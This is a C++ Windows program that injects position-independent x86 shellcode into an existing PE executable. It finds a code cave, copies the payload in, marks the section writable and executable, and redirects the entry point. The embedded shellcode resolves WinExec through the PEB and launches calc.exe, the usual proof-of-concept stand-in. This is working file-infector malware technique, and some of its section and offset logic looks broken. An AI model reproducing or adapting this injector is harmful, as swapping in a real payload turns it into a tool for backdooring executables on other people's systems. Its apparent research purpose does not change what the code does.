#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <WinUser.h>
#include <winternl.h>

using namespace std;

unsigned char shellcode[] ="\x50\x53\x51\x52\x56\x57\x55\x89"
"\xe5\x83\xec\x18\x31\xf6\x56\x6a"
"\x63\x66\x68\x78\x65\x68\x57\x69"
"\x6e\x45\x89\x65\xfc\x31\xf6\x64"
"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"
"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"
"\x50\x1c\x01\xda\x89\x55\xec\x8b"
"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
"\x8b\x04\x41\x8b\x04\x82\x01\xd8"
"\x31\xd2\x52\x68\x2e\x65\x78\x65"
"\x68\x63\x61\x6c\x63\x68\x6d\x33"
"\x32\x5c\x68\x79\x73\x74\x65\x68"
"\x77\x73\x5c\x53\x68\x69\x6e\x64"
"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"; 

DWORD dwShellSize = (DWORD)sizeof(shellcode);

int main(int argc, char* argv[])
{
    //the target file is initiated here.
    const int MAX_FILEPATH = 255;
    char lpFileName[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   

    //the file is opened here.
    HANDLE hFile = CreateFileA(
        lpFileName,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    HANDLE hFileMapping = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,
        dwFileSize,
        NULL
    );
    LPBYTE lpFileAddr = (LPBYTE)MapViewOfFile(
        hFileMapping,
        FILE_MAP_READ | FILE_MAP_WRITE,
        0,
        0,
        dwFileSize
    );
    
    //the shellcode is then edited, primarily for replacing the generalistic address.
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpFileAddr;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpFileAddr + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
    DWORD dwOEP = pNtHdrs->OptionalHeader.AddressOfEntryPoint;

    for (DWORD i = 0; i < dwShellSize; i++) {
        if (*((LPDWORD)(shellcode + i)) == 0xaaaaaaaa) {
            *((LPDWORD)(shellcode + i)) = dwOEP;
            break;
        }
    }
    
    //the code cave spot is being serached, and the first found is set to be the plugging pt.
    DWORD dwCount = 0;
    DWORD dwPos;
    LPVOID lpShellAddr = 0;
    for (dwPos = pNtHdrs->OptionalHeader.SizeOfHeaders; dwPos < dwFileSize; dwPos++)
    {
        if (*(lpFileAddr + dwPos) == 0x00) {
            if (dwCount++ == dwShellSize)
            {
                lpShellAddr = (LPVOID)(lpFileAddr + dwPos - dwShellSize);
                break;
            }
        }
        else {
            dwCount = 0;
        }
    }

    //if there are no favourable spot, another section for that is created.
    /*DWORD dwNewSecRVA = 0, dwNewSecRaw = 0;
    if (!lpShellAddr) {
        while (pSecHdr->SizeOfRawData != 0) {
            pSecHdr++;
        }
        dwNewSecRVA = pSecHdr->VirtualAddress + pSecHdr->Misc.VirtualSize;
        dwNewSecRaw = pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData;
        pNtHdrs->FileHeader.NumberOfSections++;
        strncpy((char*)pSecHdr->Name, ". / 001" , IMAGE_SIZEOF_SHORT_NAME);
        pNtHdrs->OptionalHeader.SizeOfImage += pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->SizeOfRawData = pNtHdrs->OptionalHeader.FileAlignment;
        pSecHdr->Misc.VirtualSize = pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->PointerToRawData = dwNewSecRaw;
        pSecHdr->VirtualAddress = dwNewSecRVA;
        ZeroMemory((LPVOID)(
            (DWORD)lpFileAddr + dwNewSecRaw),
            pNtHdrs->OptionalHeader.FileAlignment
        );
        lpShellAddr = (LPVOID)(lpFileAddr + dwNewSecRaw);
        cout << "Added section: " << " " << pSecHdr->Name;
    }*/
    //plug the shellcode
    memcpy(lpShellAddr, shellcode, dwShellSize);

    //the pe file info in the targeted section is altered for its sake...
    DWORD i = dwPos;
    DWORD shellOffset = (DWORD)lpShellAddr - pDosHdr->e_lfanew;
    pSecHdr[i].Misc.VirtualSize += dwShellSize;
    pSecHdr[i].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    pNtHdrs->OptionalHeader.AddressOfEntryPoint = shellOffset - pSecHdr[i].PointerToRawData + pSecHdr[i].VirtualAddress;

    //exiting
    return 0;
}

//credentials: https://sec.vnpt.vn/2023/05/pe-injection/, https://sec.vnpt.vn/2023/07/tim-dia-chi-kernel32-dll-va-cac-ham-api/ 